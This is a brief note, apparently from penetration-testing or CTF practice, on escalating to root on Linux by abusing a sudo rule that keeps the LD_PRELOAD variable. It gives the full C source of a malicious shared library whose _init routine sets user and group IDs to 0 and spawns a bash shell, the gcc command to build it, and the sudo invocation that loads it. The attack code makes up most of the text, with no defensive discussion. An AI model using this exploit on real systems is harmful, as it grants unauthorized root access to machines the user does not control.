loading before running library

1. run sudo -
2. you should see LD_PRELOAD under

![file:///tmp/.P4RB62/1.png](file:///tmp/.P4RB62/1.png)


<h3>make a malicious library</h3>
1. make a malicious library
2. compile it 
	``gcc -fPIC -shared -o shell.so shell.c -nostartfiles``

**source code:**
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init( ) {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

![file:///tmp/.P4RB62/2.png](file:///tmp/.P4RB62/2.png)

**run**

1. ls the directory where you saved it
2.  ``sudo LD_PRELOAD=directory/of/shell.so (add the no passwd command)``
![file:///tmp/.P4RB62/3.png](file:///tmp/.P4RB62/3.png)

